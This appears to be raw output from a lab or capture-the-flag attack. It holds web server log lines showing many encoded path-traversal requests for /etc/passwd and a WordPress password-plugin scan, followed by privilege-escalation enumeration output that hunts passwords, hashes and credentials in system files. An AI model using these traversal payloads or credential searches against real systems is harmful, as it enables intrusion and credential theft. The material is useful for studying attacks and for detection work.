+192.168.49.169 - - [05/Jun/2021:08:38:17 +0000] "GET /~nobody/etc/passwd HTTP/1.1" 403 980
+192.168.49.169 - - [05/Jun/2021:08:38:29 +0000] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:38:43 +0000] "GET /DomainFiles/*//../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:38:52 +0000] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:38:54 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:41:41 +0000] "GET ../../../../../../../../../../etc/passw* HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:45:21 +0000] "GET ////////../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:54:47 +0000] "GET /htdocs/../../../../../../../../../../../etc/passwd HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:09:04:40 +0000] "GET /htdocs/../../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:09:05:25 +0000] "HEAD /wp-content/plugins/access-category-password/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:07:26 +0000] "HEAD /wp-content/plugins/advanced-password-security/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:08:24 +0000] "HEAD /wp-content/plugins/alex-wrong-password/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:09:27 +0000] "HEAD /wp-content/plugins/apache-password-protect/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:09:36 +0000] "HEAD /wp-content/plugins/application-passwords-manager/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:09:36 +0000] "HEAD /wp-content/plugins/application-passwords/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:10:01 +0000] "HEAD /wp-content/plugins/as-password-field-in-default-registration-form/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:10:05 +0000] "HEAD /wp-content/plugins/askapache-password-protect/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:10:41 +0000] "HEAD /wp-content/plugins/auto-expire-passwords/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:12:13 +0000] "HEAD /wp-content/plugins/baw-force-new-password/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:12:33 +0000] "HEAD /wp-content/plugins/bdvs-password-reset/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:13:00 +0000] "HEAD /wp-content/plugins/better-passwords/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:14:15 +0000] "HEAD /wp-content/plugins/bodi0s-password-generator/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:15:26 +0000] "HEAD /wp-content/plugins/buddy-press-force-password-change/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:15:39 +0000] "HEAD /wp-content/plugins/buddypress-password-strength-indicator/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:15:39 +0000] "HEAD /wp-content/plugins/buddypress-password-strength-meter/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:15:41 +0000] "HEAD /wp-content/plugins/buddypress-secure-passwords/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:15:55 +0000] "HEAD /wp-content/plugins/bulk-password-protect-post-types/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:15:55 +0000] "HEAD /wp-content/plugins/bulk-password-reset/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:16:58 +0000] "HEAD /wp-content/plugins/case-insensitive-passwords/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:17:19 +0000] "HEAD /wp-content/plugins/cb-lost-password-remover/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:17:36 +0000] "HEAD /wp-content/plugins/cf7-add-password-field/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:17:55 +0000] "HEAD /wp-content/plugins/change-password-e-mail/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:17:55 +0000] "HEAD /wp-content/plugins/change-password-protected-message/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:18:12 +0000] "HEAD /wp-content/plugins/cheerful-password-generator/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:18:23 +0000] "HEAD /wp-content/plugins/chris-force-password-reset/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:18:36 +0000] "HEAD /wp-content/plugins/clarify-password-reset/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:19:27 +0000] "HEAD /wp-content/plugins/codetree-password-reminder/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:21:24 +0000] "HEAD /wp-content/plugins/cosmic-bp-user-signup-password-en-espanol/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:21:24 +0000] "HEAD /wp-content/plugins/cosmic-bp-user-signup-password/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:21:43 +0000] "HEAD /wp-content/plugins/create-user-with-password-multisite/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:22:12 +0000] "HEAD /wp-content/plugins/current-password/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:22:36 +0000] "HEAD /wp-content/plugins/custom-password-encryption/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:22:36 +0000] "HEAD /wp-content/plugins/custom-password-protected-text/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:23:15 +0000] "HEAD /wp-content/plugins/dark-sources-password-scrubber/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:23:46 +0000] "HEAD /wp-content/plugins/delayed-password-masking/ HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:09:24:23 +0000] "HEAD /wp-content/plugins/disable-application-passwords/ HTTP/1.1" 404 -
+
+[+] Finding emails inside logs (limit 70)
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding passwords inside key folders (limit 70) - only PHP files
+
+[+] Finding passwords inside key folders (limit 70) - no PHP files
+/etc/httpd/conf/extra/httpd-ssl.conf:#     file needs this password: `xxj31ZMTZzkVA'.
+/etc/nsswitch.conf:passwd: files systemd
+/etc/pam.d/passwd:#password     required        pam_cracklib.so difok=2 minlen=8 dcredit=2 ocredit=2 retry=3
+/etc/pam.d/system-auth:-password  [success=1 default=ignore]  pam_systemd_home.so
+/etc/profile.d/vte.sh:  [ "$PWD" != "$HOME" ] && pwd=${PWD/#$HOME\//\~\/}
+/etc/profile.d/vte.sh:  local pwd='~'
+/etc/profile.d/vte.sh:  pwd="${pwd//[[:cntrl:]]}"
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/ssl/openssl.cnf.dist:# input_password = secret
+/etc/ssl/openssl.cnf.dist:# output_password = secret
+/etc/ssl/openssl.cnf.dist:challengePassword             = A challenge password
+/etc/ssl/openssl.cnf.dist:challengePassword_max         = 20
+/etc/ssl/openssl.cnf.dist:challengePassword_min         = 4
+/etc/ssl/openssl.cnf:# input_password = secret
+/etc/ssl/openssl.cnf:# output_password = secret
+/etc/ssl/openssl.cnf:challengePassword          = A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max              = 20
+/etc/ssl/openssl.cnf:challengePassword_min              = 4
+
+[+] Finding possible password variables inside key folders (limit 140)
+/etc/healthd.conf:ADMIN_EMAIL="root"
+
+[+] Finding possible password in config files
+ /etc/security/faillock.conf
+passwd and ignore centralized (AD, IdM, LDAP, etc.) users.
+ /etc/httpd/conf/extra/httpd-dav.conf
+password database:
+passwd" DAV-upload admin
+passwd"
+ /etc/httpd/conf/extra/httpd-ssl.conf
+passwd.srpv -add username"
+passwd.srpv"
+password is obtained from the user. Every entry in the user
+password: `xxj31ZMTZzkVA'.
+ /etc/httpd/conf/httpd.conf
+passwd files from being
+ /etc/nscd.conf
+passwd, group, hosts, services
+passwd          yes
+passwd          600
+passwd          20
+passwd          211
+passwd          yes
+passwd          yes
+passwd          yes
+passwd          33554432
+passwd          yes
+ /etc/nsswitch.conf
+passwd: files systemd
+
+[+] Finding 'username' string inside key folders (limit 70)
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50 - only 1 per file)
+/etc/machine-id:54ecd58cf3cf489fa4da8e9f52e4440e
+/home/commander/local.txt:66eb3a347a048ffc47a67ec4029c7cf1
+
+[+] Finding URIs with user:password@host inside key folders
